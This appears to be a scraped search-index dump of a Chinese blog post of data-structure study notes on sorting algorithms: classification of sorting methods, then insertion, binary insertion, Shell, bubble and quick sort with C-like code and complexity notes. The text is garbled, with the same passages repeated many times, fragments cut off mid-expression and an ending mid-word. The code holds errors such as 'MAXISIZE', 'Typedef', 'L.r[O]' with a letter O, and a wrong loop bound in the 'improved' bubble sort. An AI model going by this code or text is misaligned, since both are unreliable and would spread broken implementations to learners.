排序方法分类\r按照存储介质分**内部排序：**数据量不大、数据在内存、无需内外存交换数据 **外部排序：**数据量较大、数据在外存（文件排序） 外部排序时，要将数据分批调入内存来排序，中间结果还要即使放入外存，外部排序要复杂得多。 按比较器个数分**串行排序：**单处理机(同一时刻比较一对元素) **并行排序：**多处理机(同一时刻比较多对元素) 按主要操作分**比较排序：**用比较的方法 插入排序，交换排序，选择排序，归并排序 **基数排序：**不比较元素的大小，仅仅根据元素本身的取值确定其有序位置。 按辅助空间分**原地排序：**辅助空间用量为O(1)的排序方法。 （所占的辅助存储空间与参与排序的数据量大小无关） **非原地排序：**辅助空间用量超过O(1)的排序方法。 按稳定性分**稳定排序：**能够使任何数值相等的元素，排序后相对次序 不变。 **非稳定性排序：**不是稳定排序的方法。 按自然性分**自然排序：**输入数据越有序，排序的速度越快的排序方法。 **非自然排序：**不是自然排序的方法。 记录序列以顺序表存储 #define MAXSIZE 20 typedef int KeyType; Typedef struct{ KeyType key; InfoType otherinfo; }RedType; typedef struct{ RedType r[MAXISIZE+1]; int length; }SqList; ","date":"2023-12-19","objectID":"/data_structure_notes/:8:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#按照存储介质分"},{"categories":["notice"],"content":"\r概述**什么是排序：**排序是将一组杂乱无章的数据按一定规律顺次排列起来 **排序的目的：**便于查找 排序方法分类\r按照存储介质分**内部排序：**数据量不大、数据在内存、无需内外存交换数据 **外部排序：**数据量较大、数据在外存（文件排序） 外部排序时，要将数据分批调入内存来排序，中间结果还要即使放入外存，外部排序要复杂得多。 按比较器个数分**串行排序：**单处理机(同一时刻比较一对元素) **并行排序：**多处理机(同一时刻比较多对元素) 按主要操作分**比较排序：**用比较的方法 插入排序，交换排序，选择排序，归并排序 **基数排序：**不比较元素的大小，仅仅根据元素本身的取值确定其有序位置。 按辅助空间分**原地排序：**辅助空间用量为O(1)的排序方法。 （所占的辅助存储空间与参与排序的数据量大小无关） **非原地排序：**辅助空间用量超过O(1)的排序方法。 按稳定性分**稳定排序：**能够使任何数值相等的元素，排序后相对次序 不变。 **非稳定性排序：**不是稳定排序的方法。 按自然性分**自然排序：**输入数据越有序，排序的速度越快的排序方法。 **非自然排序：**不是自然排序的方法。 记录序列以顺序表存储 #define MAXSIZE 20 typedef int KeyType; Typedef struct{ KeyType key; InfoType otherinfo; }RedType; typedef struct{ RedType r[MAXISIZE+1]; int length; }SqList; ","date":"2023-12-19","objectID":"/data_structure_notes/:8:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#按比较器个数分"},{"categories":["notice"],"content":"\r概述**什么是排序：**排序是将一组杂乱无章的数据按一定规律顺次排列起来 **排序的目的：**便于查找 排序方法分类\r按照存储介质分**内部排序：**数据量不大、数据在内存、无需内外存交换数据 **外部排序：**数据量较大、数据在外存（文件排序） 外部排序时，要将数据分批调入内存来排序，中间结果还要即使放入外存，外部排序要复杂得多。 按比较器个数分**串行排序：**单处理机(同一时刻比较一对元素) **并行排序：**多处理机(同一时刻比较多对元素) 按主要操作分**比较排序：**用比较的方法 插入排序，交换排序，选择排序，归并排序 **基数排序：**不比较元素的大小，仅仅根据元素本身的取值确定其有序位置。 按辅助空间分**原地排序：**辅助空间用量为O(1)的排序方法。 （所占的辅助存储空间与参与排序的数据量大小无关） **非原地排序：**辅助空间用量超过O(1)的排序方法。 按稳定性分**稳定排序：**能够使任何数值相等的元素，排序后相对次序 不变。 **非稳定性排序：**不是稳定排序的方法。 按自然性分**自然排序：**输入数据越有序，排序的速度越快的排序方法。 **非自然排序：**不是自然排序的方法。 记录序列以顺序表存储 #define MAXSIZE 20 typedef int KeyType; Typedef struct{ KeyType key; InfoType otherinfo; }RedType; typedef struct{ RedType r[MAXISIZE+1]; int length; }SqList; ","date":"2023-12-19","objectID":"/data_structure_notes/:8:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#按主要操作分"},{"categories":["notice"],"content":"\r概述**什么是排序：**排序是将一组杂乱无章的数据按一定规律顺次排列起来 **排序的目的：**便于查找 排序方法分类\r按照存储介质分**内部排序：**数据量不大、数据在内存、无需内外存交换数据 **外部排序：**数据量较大、数据在外存（文件排序） 外部排序时，要将数据分批调入内存来排序，中间结果还要即使放入外存，外部排序要复杂得多。 按比较器个数分**串行排序：**单处理机(同一时刻比较一对元素) **并行排序：**多处理机(同一时刻比较多对元素) 按主要操作分**比较排序：**用比较的方法 插入排序，交换排序，选择排序，归并排序 **基数排序：**不比较元素的大小，仅仅根据元素本身的取值确定其有序位置。 按辅助空间分**原地排序：**辅助空间用量为O(1)的排序方法。 （所占的辅助存储空间与参与排序的数据量大小无关） **非原地排序：**辅助空间用量超过O(1)的排序方法。 按稳定性分**稳定排序：**能够使任何数值相等的元素，排序后相对次序 不变。 **非稳定性排序：**不是稳定排序的方法。 按自然性分**自然排序：**输入数据越有序，排序的速度越快的排序方法。 **非自然排序：**不是自然排序的方法。 记录序列以顺序表存储 #define MAXSIZE 20 typedef int KeyType; Typedef struct{ KeyType key; InfoType otherinfo; }RedType; typedef struct{ RedType r[MAXISIZE+1]; int length; }SqList; ","date":"2023-12-19","objectID":"/data_structure_notes/:8:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#按辅助空间分"},{"categories":["notice"],"content":"\r概述**什么是排序：**排序是将一组杂乱无章的数据按一定规律顺次排列起来 **排序的目的：**便于查找 排序方法分类\r按照存储介质分**内部排序：**数据量不大、数据在内存、无需内外存交换数据 **外部排序：**数据量较大、数据在外存（文件排序） 外部排序时，要将数据分批调入内存来排序，中间结果还要即使放入外存，外部排序要复杂得多。 按比较器个数分**串行排序：**单处理机(同一时刻比较一对元素) **并行排序：**多处理机(同一时刻比较多对元素) 按主要操作分**比较排序：**用比较的方法 插入排序，交换排序，选择排序，归并排序 **基数排序：**不比较元素的大小，仅仅根据元素本身的取值确定其有序位置。 按辅助空间分**原地排序：**辅助空间用量为O(1)的排序方法。 （所占的辅助存储空间与参与排序的数据量大小无关） **非原地排序：**辅助空间用量超过O(1)的排序方法。 按稳定性分**稳定排序：**能够使任何数值相等的元素，排序后相对次序 不变。 **非稳定性排序：**不是稳定排序的方法。 按自然性分**自然排序：**输入数据越有序，排序的速度越快的排序方法。 **非自然排序：**不是自然排序的方法。 记录序列以顺序表存储 #define MAXSIZE 20 typedef int KeyType; Typedef struct{ KeyType key; InfoType otherinfo; }RedType; typedef struct{ RedType r[MAXISIZE+1]; int length; }SqList; ","date":"2023-12-19","objectID":"/data_structure_notes/:8:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#按稳定性分"},{"categories":["notice"],"content":"\r概述**什么是排序：**排序是将一组杂乱无章的数据按一定规律顺次排列起来 **排序的目的：**便于查找 排序方法分类\r按照存储介质分**内部排序：**数据量不大、数据在内存、无需内外存交换数据 **外部排序：**数据量较大、数据在外存（文件排序） 外部排序时，要将数据分批调入内存来排序，中间结果还要即使放入外存，外部排序要复杂得多。 按比较器个数分**串行排序：**单处理机(同一时刻比较一对元素) **并行排序：**多处理机(同一时刻比较多对元素) 按主要操作分**比较排序：**用比较的方法 插入排序，交换排序，选择排序，归并排序 **基数排序：**不比较元素的大小，仅仅根据元素本身的取值确定其有序位置。 按辅助空间分**原地排序：**辅助空间用量为O(1)的排序方法。 （所占的辅助存储空间与参与排序的数据量大小无关） **非原地排序：**辅助空间用量超过O(1)的排序方法。 按稳定性分**稳定排序：**能够使任何数值相等的元素，排序后相对次序 不变。 **非稳定性排序：**不是稳定排序的方法。 按自然性分**自然排序：**输入数据越有序，排序的速度越快的排序方法。 **非自然排序：**不是自然排序的方法。 记录序列以顺序表存储 #define MAXSIZE 20 typedef int KeyType; Typedef struct{ KeyType key; InfoType otherinfo; }RedType; typedef struct{ RedType r[MAXISIZE+1]; int length; }SqList; ","date":"2023-12-19","objectID":"/data_structure_notes/:8:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#按自然性分"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key\u003cL.r[i-1].key){ // 若\"\u003c\",需将L.r[i]插入有序子表 L.r[O]=L.r[i]; // 复制为哨兵 for(j=i-1;L.r[0].key\u003cL.r[j].key;--j){ L.r[j+1]=L.r[j]; // 记录后移 } L.r[j+1]=L.r[O]; // 插入到正确位置 } } } 性能分析基本操作： （1）“比较”序列中两个关键字的大小； （2）“移动”记录。 最好的情况（关键字在记录序列中顺序有序） 最坏的情况（关键字在记录序列中逆序有序） 最坏的情况 结论 原始数据越接近有序，排序速度越快 最坏情况（输入数据是逆有序的） Tw(n)=O(n^2) 平均情况下，耗时差不多是最坏情况的一半 Te(n)=O(n^2) 要提高查找速度： 减少元素的比较次数 减少元素的移动次数 折半插入排序查找插入位置是采用折半查找法 void BInsertSort(SqList \u0026L){ for(i=2;i\u003c=L.length;++i){ L.r[0]=L.r[i]; low=1;high=i-1; while(low\u003c=high){ mid=(low+high)/2; if(L.r[0].key\u003cL.r[mid].key) high=mid-1; else low=mid+1; } for(j=i-1;j\u003e=high+1;--j) L.r[j+1]=L.r[j]; l.r[high+1]=L.r[0]; } } 性能分析查找： 折半查找比顺序查找快，所以折半排序就平均性能来说比直接插入排序要快； 它所需要的关键码比较次数与待排序对象序列的初始排列无关，仅依赖于对象个数。在插入第i个对象时，需要经过⌊log2 i⌋ +1次关键码比较，才能确定它应插入的位置； 当n较大时，总关键码比较次数比直接插入排序的最坏情况要好得多，但比其最好情况要差; 在对象的初始排列已经按关键码排好序或接近有序时，直接插入排序比折半插入排序执行的关键码比较次数要少； 移动： 折半插入排序的对象移动次数与直接插入排序相同，依赖于对象的初始排列 减少了比较次数，但没有减少移动次数 平均性能优于直接插入排序 时间复杂度为O(n^2) 空间复杂度为O(1) 是一种稳定的排序方法 希尔排序Donald.L.Shell 基本思想先将整个待排记录序列分割成若干子序列，分别进行直接插入排序，待整个序列中的记录”基本有序“时，再对全体记录进行一次直接插入排序。 算法特点（1）缩小增量 （2）多遍插入排序 举例\r思路\r特点 一次移动，移动位置较大，跳跃式地接近排序后的最终位置 最后一次只需要少量移动 增量序列必须是递减的，最后一个必须是1 增量序列应该是互质的 算法实现主程序 void ShellSort(Sqlist \u0026L, int dlta[], int t){ //按增量序列dlta[0...t-1]对顺序表L作希尔排序 for(k=0;k\u003ct;++k) ShellInsert(L, dlta[k]);//一趟增量为dlta[k]的插入排序 } 其中某一趟的排序操作 void ShellInsert(SqList \u0026L, int dk){ //对顺序表L进行一趟增量为dk的Shell排序，dk为步长因子 for(i=dk+1;i\u003c=L.length;++i) if(r[i].key\u003cr[i-dk].key){ r[0]=r[i]; for(j=i-dk;j\u003e0\u0026\u0026(r[0].key\u003cr[j].key);j=j-dk) r[j+dk]=r[j]; r[j+dk]=r[0]; } } 算法分析希尔排序算法效率与增量序列的取值有关 时间效率 稳定性 希尔排序是一种不稳定的排序算法。 总结 时间复杂度是n和d的函数公式（经验公式）： 空间复杂度为O(1) 如何选择最佳d序列，目前尚未解决 最后一个增量值必须为1，无除了1之外的公因子 不适合在链式存储结构上实现 交换排序\r冒泡排序\r基本思想每趟不断将记录两两比较，并按”前小后大“规则交换。 void bubble_sort(SqList \u0026L){//冒泡排序算法 int m,i,j; RedType x; //交换时临时存储 for(m=1;m\u003c=n-1;m++){ //总共需m趟 for(j=1;j\u003c=n-m;j++) if(L.r[j].key\u003eL.r[j+1].key){//发生逆序 x=L.r[j];L.r[j]=L.r[j+1];L.r[j+1]=x;//交换 }//endif }//for } **优点：**每趟结束时，不仅能挤出一个最大值到最后面的位置，还能同时部分理顺其他元素； 如何提高效率？ 一旦某一趟比较时不出现记录交换，说明已经排好序了，就可以结束本算法。 算法改进 void bubble_sort(SqList \u0026L){ //改进的冒泡排序算法 int m,i,j,flag=1; RedType x; //flag作为是否有交换的标记 for(m=1; m\u003c=n-1\u0026\u0026flag==1; m++) { flag=0; for(j=1;j\u003c=m;j++) if(L.r[j].key\u003eL.r[j+1].key){ //发生逆序 flag=1; //发生交换，flag置为1，若本趟没发生交换，flag保持为0 x=L.r[j];L.r[j]=L.r[j+1];L.r[j+1]=x; //交换 } //endif }//for } 算法分析 最好情况（正序） 比较次数：n-1 移动次数：0 最坏情况（逆序） 比较次数： 移动次数： 时间复杂度 最好情况时间复杂度O(n) 最坏情况时间复杂度O(n^2) 平均情况时间复杂度O(n^2) 空间复杂度 需要添加一个辅助空间temp，辅助空间S(n)=O(1) 稳定性 冒泡排序是稳定的。 快速排序\r基本思想通过一趟排序，将待排序记录分割成独立的两部分，其中前部分记录的关键字均比另一部分记录的关键字小，则可分别对这两部分记录进行排序，以达到整个序列有序。 **实现过程：**选定一个中间数作为参考，所有元素与之比较，小的调到其左边，大的调到其右边。 **（枢轴）中间数：**可以是第一个数、最后一个数、最中间一个数、任选一个数。 即： 任取一个元素为中心(pivot) 所有比它小的元素一律前放，比它大的元素一律后放 形成左右两个子表： 对各子表重新选择中心元素并依次规则调整 直到每个子表的元素只剩一个 实例\r过程描述①每一趟的子表的形成是采用从两头向中间交替式逼近法； ②由于每趟中对各子表的操作都相似，可采用递归算法。 算法实现 void main(){ QSort(L,1,L.length); } 对顺序表L快速排序 void QSort (SqList \u0026L, int low, int high){ if(low\u003chigh){ // 长度大于1 pivotloc = Partition(L, low, high); // 将L.r[low..high]一分为二，pivotloc为枢轴元素排好序的位置 QSort(L,low, pivotloc-1); // 对低子表递归排序 QSort(L,pivotloc+1,high); // 对高子表递归排序 }//endif }//QSort 中间数选择函数 int Partition (SqList \u0026L, int low, int high ) { L.r[O] = L.r[low]; pivotkey = L.r[low].key; while (low \u003c high ) { while (low \u003c high \u0026\u0026 L.r[high].key \u003e= pivotkey ) --high; L.r[low] = L.r[high]; while(low\u003chigh\u0026\u0026L.r[low].key\u003c=pivotkey) ++low; L.r[high]=L.r[low]; } L.r[low]=L.r[0]； return low; } 算法分析时间复杂度 可证明，平均时间复杂度O(nlog2 n) Qsort()：O(log2 n) Partition()：O(n) 实验结果表明：就平均计算时间而言，快速排序是我们所讨论的所有内排序方法中最好的一个 空间复杂度 快速排序不是原地排序 由于程序中使用了递归，需要递归调用栈的支持，而栈的长度取决于递归调用的深度。(即使不用递归，也需要用用户栈) 平均情况下：需要O(log n)的栈空间 最坏情况下：栈空间可达O(n) 稳定性 快速排序是一种不稳定的排序方法。 快速排序不适于对原本有序或基本有序的记录序列进行排序。（会退化成没有改进措施的冒泡排序。） 划分元素的选取是影响时间性能的关键。 输入数据次序越乱，所选划分元素值的随机性越好，排序速度越快，快速排序不是自然排序方法。 改变划分元素的选取方法，至多只能改变算法平均情况的下的时间性能，无法改变最坏情况下的时间性能。即最坏情况下，快速排序的时间复杂性总是O(n^2)。 选择排序\r简单选","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#排序算法分类"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#插入排序"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#直接插入排序"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#性能分析-4"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#结论-1"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#折半插入排序"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#性能分析-5"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#希尔排序"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#基本思想"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#算法特点"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#举例"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#思路"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#特点-3"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#算法实现-4"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#算法分析"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#交换排序"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#冒泡排序"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#基本思想-1"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#算法改进"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#算法分析-1"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#快速排序"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#基本思想-2"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#实例"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#过程描述"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 在有序序列中插入一个元素，保持序列有序，有序长度不断增加。 起初，a[0]是长度为1的子序列。然后，逐一将a[1]至a[n-1]插入到有序子序列中。 直接插入排序\rvoid InsertSort(SqList \u0026L){ int i,j; for(i=2;i\u003c=L.length; ++i){ if(L.r[i].key","date":"2023-12-19","objectID":"/data_structure_notes/:8:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#算法实现-5"},{"categories":["notice"],"content":"\r排序算法分类规则不同： 插入排序 交换排序 选择排序 归并排序 时间复杂度不同： 简单排序 先进排序 插入排序**基本思想：**有序插入。 